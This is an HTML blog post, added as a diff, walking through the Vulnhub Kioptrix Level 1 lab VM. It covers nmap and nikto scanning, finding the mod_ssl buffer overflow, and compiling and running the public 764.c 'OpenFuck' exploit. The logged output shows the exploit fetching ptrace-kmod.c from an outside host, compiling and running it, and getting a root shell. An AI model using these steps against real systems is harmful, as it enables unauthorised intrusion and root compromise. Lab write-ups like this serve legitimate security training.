@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Kioptix Level 1
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Jan 4, 2021
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Kioptix Level 1</a></li>
+        </ul>
+    </nav>
+<p>From this list: <code>https://github.com/Ignitetechnologies/CTF-Difficulty</code></p>
+<h3>Scanning</h3>
+<p>Find the device on the network:</p>
+<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.0.1-255
+
+Nmap scan report for 192.168.0.202
+Host is up (0.00098s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+1024/tcp open  kdm
+
+</span></code></pre>
+<p>Find details about running services:</p>
+<ul>
+<li>Important details apache version, hostname</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.0.202
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-04 10:13 EST
+Nmap scan report for 192.168.0.202
+Host is up (0.00060s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+1024/tcp open  status      1 (RPC #100024)
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+</span></code></pre>
+<h3>Web:</h3>
+<p>Index Page:</p>
+<img src="images/kio1.png">
+<p>Enumeration:</p>
+<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.0.202
+</span></code></pre>
+<ul>
+<li>Found nothing</li>
+</ul>
+<p>With nikto:</p>
+<pre><code><span>crazyeights@es-base:~$ nikto -h http://192.168.0.202
+
++ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+[SNIP]
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+[SNIP]
+</span></code></pre>
+<ul>
+<li>The vulnerability must involve mod_ssl:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ searchsploit mod_ssl
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Apache mod_ssl 2.0.x - Remote Denial of Servi | linux/dos/24590.txt
+Apache mod_ssl 2.8.x - Off-by-One HTAccess Bu | multiple/dos/21575.txt
+Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' | unix/remote/21671.c
+Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote/47080.c
+Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote/764.c
+Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-bet | unix/remote/40347.txt
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+crazyeights@es-base:~$ 
+
+</span></code></pre>
+<ul>
+<li>Using 764.c - most recent i think</li>
+<li>Couldn't compile exploit</li>
+</ul>
+<p>Found:</p>
+<pre><code><span>https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/
+</span></code></pre>
+<p>Make the changes it says in the article, and it will compile, and download ptrace-mod (2021)</p>
+<p>Compile the exploit:</p>
+<pre><code><span>crazyeights@es-base:~$ gcc -o 764 764.c -lcrypto
+</span></code></pre>
+<ul>
+<li>Exploit Usage:</li>
+</ul>
+<pre><code><span>: Usage: ./764 target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+</span></code></pre>
+<ul>
+<li>You have to select the OS, and apache version</li>
+<li>There are two possiblilities:</li>
+</ul>
+<pre><code><span>0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+</span></code></pre>
+<ul>
+<li>This doesn't work:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ ./764 0x6a 192.168.0.202 443 -c 40
+</span></code></pre>
+<ul>
+<li>This one works:</li>
+</ul>
+<pre><code><span>crazyeights@es-base:~$ ./764 0x6b 192.168.0.202 443 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8070
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304 
+--11:58:50--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+11:58:50 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 6283
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+</span></code></pre>
+<h3>Root:</h3>
+<ul>
+<li>We have a root shell:</li>
+</ul>
+<pre><code><span>id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+</span></code></pre>
+<p>Looked for flags found none.</p>
+<p>FIN. 🥳</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
